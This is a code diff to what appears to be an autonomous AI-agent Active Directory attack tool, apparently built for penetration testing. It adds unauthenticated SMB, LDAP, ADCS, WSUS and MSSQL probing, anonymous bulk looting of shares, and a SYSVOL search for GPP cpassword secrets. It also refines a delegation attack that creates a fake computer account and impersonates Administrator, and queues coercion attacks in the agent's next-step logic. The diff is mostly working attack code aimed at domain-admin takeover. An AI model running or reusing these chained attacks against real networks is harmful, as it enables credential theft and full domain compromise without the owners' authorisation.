@@ -2867,6 +2867,22 @@ TOOLS = [
         }
     },
     {
+        "name": "no_cred_surface_recon",
+        "description": (
+            "No-credential external AD surface reconnaissance. Checks SMB null/guest exposure, "
+            "HTTP/HTTPS apps including ADCS /certsrv, WSUS ports, MSSQL exposure, and LDAP RootDSE "
+            "without requiring a username or password."
+        ),
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "dc_ip":  {"type": "string"},
+                "domain": {"type": "string"}
+            },
+            "required": ["dc_ip", "domain"]
+        }
+    },
+    {
         "name": "agent_complete",
         "description": "Signal that the agent has completed its mission. Call this when DA is achieved or all paths are exhausted.",
         "input_schema": {
@@ -3813,6 +3829,12 @@ def tool_enumerate_shares(dc_ip: str, domain: str, username: str,
         elif not shares_out:
             shares_out = ntlm_out  # at least surface the diagnostic
 
+    if not re.search(r"\b(READ|WRITE|Disk|IPC)\b", shares_out, re.I) and not auth_pw and not krb_active:
+        null_out = _nxc(f"smb {shell_quote(dc_ip)} -u '' -p '' -d {shell_quote(domain)} --shares", timeout=20)
+        guest_out = _nxc(f"smb {shell_quote(dc_ip)} -u 'guest' -p '' -d {shell_quote(domain)} --shares", timeout=20)
+        shares_out = "\n".join(x for x in (null_out, guest_out) if x.strip())
+        chosen = "null/guest"
+
     if not shares_out.strip():
         shares_out = "(empty — both Kerberos and NTLM share enumeration returned no output)"
 
@@ -3829,7 +3851,11 @@ def tool_enumerate_shares(dc_ip: str, domain: str, username: str,
         dest.mkdir(parents=True, exist_ok=True)
         old_cwd = os.getcwd()
         os.chdir(dest)
-        _run(f"smbclient //{dc_ip}/{share} -U '{domain}\\{username}%{password}' "
+        if pw or username:
+            smb_auth = f"-U '{domain}\\{username}%{pw}'"
+        else:
+            smb_auth = "-N"
+        _run(f"smbclient //{dc_ip}/{share} {smb_auth} "
              f"-c 'prompt OFF; recurse ON; mget *' 2>/dev/null", timeout=30)
         os.chdir(old_cwd)
 
@@ -3855,8 +3881,12 @@ def tool_enumerate_shares(dc_ip: str, domain: str, username: str,
                             "Audit file share contents; rotate credentials")
 
     # Also search SYSVOL for GPP
+    if pw or username:
+        sysvol_auth = f"-U '{domain}\\{username}%{pw}'"
+    else:
+        sysvol_auth = "-N"
     gpp_out = _run(
-        f"smbclient //{dc_ip}/SYSVOL -U '{domain}\\{username}%{password}' "
+        f"smbclient //{dc_ip}/SYSVOL {sysvol_auth} "
         f"-c 'recurse ON; prompt OFF; mget *.xml' 2>/dev/null && "
         f"grep -r 'cpassword' /tmp/agent_loot/ 2>/dev/null | head -10", timeout=30)
     if "cpassword" in gpp_out.lower():
@@ -6399,6 +6429,64 @@ def tool_kerbrute_enum(dc_ip: str, domain: str,
     return f"No valid users found (or kerbrute not installed)\nOutput:\n{out[:1000]}"
 
 
+def tool_no_cred_surface_recon(dc_ip: str, domain: str) -> str:
+    """No-credential checks for externally visible AD attack surface."""
+    results = []
+    intel = SESSION.setdefault("agent_intel", {})
+    open_ports = {str(p) for p in intel.get("open_ports", [])}
+
+    def _port_known(port: str) -> bool:
+        return not open_ports or str(port) in open_ports
+
+    if _port_known("389"):
+        base = _run(
+            f"ldapsearch -x -H ldap://{shell_quote(dc_ip)} -s base -b '' "
+            f"defaultNamingContext dnsHostName supportedCapabilities 2>/dev/null",
+            timeout=10,
+        )
+        results.append(f"=== LDAP RootDSE (anonymous) ===\n{base[:800] or '(no anonymous RootDSE response)'}")
+
+    if _port_known("445"):
+        null_smb = _nxc(f"smb {shell_quote(dc_ip)} -u '' -p '' --shares", timeout=20)
+        guest_smb = _nxc(f"smb {shell_quote(dc_ip)} -u 'guest' -p '' --shares", timeout=20)
+        results.append(f"=== SMB Null Session Shares ===\n{null_smb[:900] or '(no output)'}")
+        results.append(f"=== SMB Guest Shares ===\n{guest_smb[:900] or '(no output)'}")
+        if re.search(r"\bREAD\b", null_smb + guest_smb, re.I):
+            add_finding("SMB Null/Guest Share Access", "High",
+                        "Unauthenticated or guest SMB share read access was observed",
+                        "Disable guest/null SMB access and review share ACLs")
+
+    web_ports = [p for p in ("80", "443", "8080", "8443", "8530", "8531") if _port_known(p)]
+    web_hits = []
+    for port in web_ports:
+        scheme = "https" if port in {"443", "8443", "8531"} else "http"
+        base_url = f"{scheme}://{dc_ip}:{port}"
+        headers = _run(f"curl -k -I -sS --max-time 5 {shell_quote(base_url)} 2>&1 | head -20", timeout=8)
+        certsrv = _run(f"curl -k -I -sS --max-time 5 {shell_quote(base_url + '/certsrv/')} 2>&1 | head -20", timeout=8)
+        web_hits.append(f"[{base_url}]\n{headers[:500] or '(no response)'}")
+        if any(x in certsrv.lower() for x in ("401", "200", "certsrv", "www-authenticate")):
+            web_hits.append(f"[{base_url}/certsrv/]\n{certsrv[:500]}")
+            add_finding("ADCS HTTP Endpoint Exposed", "High",
+                        f"ADCS web enrollment endpoint appears reachable at {base_url}/certsrv/",
+                        "Require EPA/channel binding and restrict ADCS web enrollment exposure")
+        if port in {"8530", "8531"} and headers:
+            add_finding("WSUS Port Exposed", "Medium",
+                        f"WSUS-like service is reachable on {base_url}",
+                        "Require TLS for WSUS and restrict management access")
+    if web_hits:
+        results.append("=== HTTP/HTTPS Surface ===\n" + "\n\n".join(web_hits)[:2500])
+
+    if _port_known("1433"):
+        mssql = _nxc(f"mssql {shell_quote(dc_ip)} -u '' -p ''", timeout=20)
+        results.append(f"=== MSSQL No-Cred Probe ===\n{mssql[:900] or '(no output)'}")
+        if "mssql" in mssql.lower() or "sql server" in mssql.lower():
+            add_finding("MSSQL Service Exposed", "Medium",
+                        f"MSSQL is reachable on {dc_ip}:1433",
+                        "Restrict MSSQL exposure and audit SQL authentication posture")
+
+    return "\n\n".join(results)[:5000] if results else "No no-credential surface checks were applicable."
+
+
 def tool_bloodyad(dc_ip: str, domain: str, username: str,
                   action: str = "get object",
                   target: str = "", attribute: str = "",
@@ -7219,50 +7307,54 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
     target_sam = target_computer.rstrip("$") + "$"
     attacker_computer = "ADSTRIKE$"
     attacker_pass = "AdStrike123!"
+    dc_host_arg = f"-dc-host {shell_quote(dc_fqdn)} " if dc_fqdn else ""
+    krb_env = f"KRB5CCNAME={shell_quote(ccache)} " if (krb and ccache) else ""
+    if krb and ccache and SESSION.get("krb5_config"):
+        krb_env += f"KRB5_CONFIG={shell_quote(SESSION.get('krb5_config'))} "
 
     # Step 1: Add fake computer account (requires MAQ > 0 or GenericAll on Computers OU)
     addcomp_py = _impacket_cmd("addcomputer")
     if krb and ccache:
-        add_cmd = (f"KRB5CCNAME={shell_quote(ccache)} {addcomp_py} "
-                   f"-dc-ip {dc_ip} -computer-name '{attacker_computer}' "
-                   f"-computer-pass '{attacker_pass}' "
-                   f"-k -no-pass '{domain}/{username}'")
+        add_cmd = (f"{krb_env}{addcomp_py} "
+                   f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                   f"-computer-name {shell_quote(attacker_computer)} "
+                   f"-computer-pass {shell_quote(attacker_pass)} "
+                   f"-k -no-pass {shell_quote(f'{domain}/{username}')}")
     else:
         pw = _real_secret(password)
-        add_cmd = (f"{addcomp_py} -dc-ip {dc_ip} "
-                   f"-computer-name '{attacker_computer}' "
-                   f"-computer-pass '{attacker_pass}' "
-                   f"'{domain}/{username}:{pw}'")
+        add_cmd = (f"{addcomp_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                   f"-computer-name {shell_quote(attacker_computer)} "
+                   f"-computer-pass {shell_quote(attacker_pass)} "
+                   f"{shell_quote(f'{domain}/{username}:{pw}')}")
     out = _run(add_cmd, timeout=30)
     results.append(f"=== Step 1: Add attacker computer ===\n{out[:600]}")
 
     # Step 2: Set RBCD via bloodyAD or rbcd.py
-    rbcd_py = os.path.expanduser("~/.local/bin/rbcd.py")
-    if not Path(rbcd_py).exists():
-        rbcd_py = "/usr/share/doc/python3-impacket/examples/rbcd.py"
+    rbcd_py = _impacket_cmd("rbcd")
     if krb and ccache:
-        rbcd_cmd = (f"KRB5CCNAME={shell_quote(ccache)} {shell_quote(sys.executable)} "
-                    f"{shell_quote(rbcd_py)} -dc-ip {dc_ip} "
-                    f"-delegate-to '{target_sam}' -delegate-from '{attacker_computer}' "
-                    f"-action write -k -no-pass '{domain}/{username}'")
+        rbcd_cmd = (f"{krb_env}{rbcd_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                    f"-delegate-to {shell_quote(target_sam)} "
+                    f"-delegate-from {shell_quote(attacker_computer)} "
+                    f"-action write -k -no-pass {shell_quote(f'{domain}/{username}')}")
     else:
         pw = _real_secret(password)
-        rbcd_cmd = (f"{shell_quote(sys.executable)} {shell_quote(rbcd_py)} "
-                    f"-dc-ip {dc_ip} "
-                    f"-delegate-to '{target_sam}' -delegate-from '{attacker_computer}' "
-                    f"-action write '{domain}/{username}:{pw}'")
+        rbcd_cmd = (f"{rbcd_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                    f"-delegate-to {shell_quote(target_sam)} "
+                    f"-delegate-from {shell_quote(attacker_computer)} "
+                    f"-action write {shell_quote(f'{domain}/{username}:{pw}')}")
     out2 = _run(rbcd_cmd, timeout=30)
     results.append(f"=== Step 2: Set RBCD ===\n{out2[:600]}")
 
     # Step 3: S4U2Proxy — get service ticket as Administrator
-    getST_py = _impacket_cmd("getST")
     fake_ts = _dc_time()
     ft = f'faketime "{fake_ts}" ' if fake_ts and shutil.which("faketime") else ""
+    getST_py = _impacket_cmd("getST", with_faketime=bool(ft))
     spn = f"cifs/{target_computer.rstrip('$').lower()}.{domain}"
-    st_cmd = (f"{ft}{shell_quote(sys.executable)} {shell_quote(getST_py)} "
-              f"-dc-ip {dc_ip} -spn '{spn}' "
+    st_cmd = (f"{ft}{getST_py} "
+              f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+              f"-spn {shell_quote(spn)} "
               f"-impersonate Administrator "
-              f"'{domain}/{attacker_computer.rstrip('$')}:{attacker_pass}'")
+              f"{shell_quote(f'{domain}/{attacker_computer.rstrip('$')}:{attacker_pass}')}")
     out3 = _run(st_cmd, timeout=30)
     results.append(f"=== Step 3: S4U2Proxy ===\n{out3[:800]}")
 
@@ -8339,6 +8431,7 @@ TOOL_MAP = {
     "request_tgt":              tool_request_tgt,
     "evil_winrm":               tool_evil_winrm,
     "kerbrute_enum":            tool_kerbrute_enum,
+    "no_cred_surface_recon":    tool_no_cred_surface_recon,
     # AD object manipulation & advanced
     "bloodyad":                 tool_bloodyad,
     "gmsa_read":                tool_gmsa_read,
@@ -8845,6 +8938,13 @@ def _pick_next_tool(completed_tools: list,
             # Anonymous LDAP enumeration (null session)
             return "enumerate_ldap", {"dc_ip": dc, "domain": dom,
                                        "username": "", "password": ""}
+        if not _done("enumerate_shares"):
+            # SMB null/guest share exposure and SYSVOL/GPP checks
+            return "enumerate_shares", {"dc_ip": dc, "domain": dom,
+                                        "username": "", "password": ""}
+        if not _done("no_cred_surface_recon"):
+            # HTTP/ADCS/WSUS/MSSQL/LDAP RootDSE no-credential surface checks
+            return "no_cred_surface_recon", {"dc_ip": dc, "domain": dom}
         if not _done("kerbrute_enum"):
             # RID cycling / username enumeration without credentials
             return "kerbrute_enum", {"dc_ip": dc, "domain": dom}
@@ -8856,6 +8956,11 @@ def _pick_next_tool(completed_tools: list,
             return "timeroast", {"dc_ip": dc, "domain": dom}
         if not _done("pre2k_attack"):
             return "pre2k_attack", {"dc_ip": dc, "domain": dom}
+        if not ntlm_off and SESSION.get("attacker_ip") and not _done("coercion_attack"):
+            return "coercion_attack", {
+                "dc_ip": dc, "domain": dom, "username": "",
+                "password": "", "attacker_ip": SESSION.get("attacker_ip", ""),
+            }
         # If we got creds from the above, re-enter the main loop
         new_u = SESSION.get("username", "")
         new_p = _real_secret(SESSION.get("password", ""))
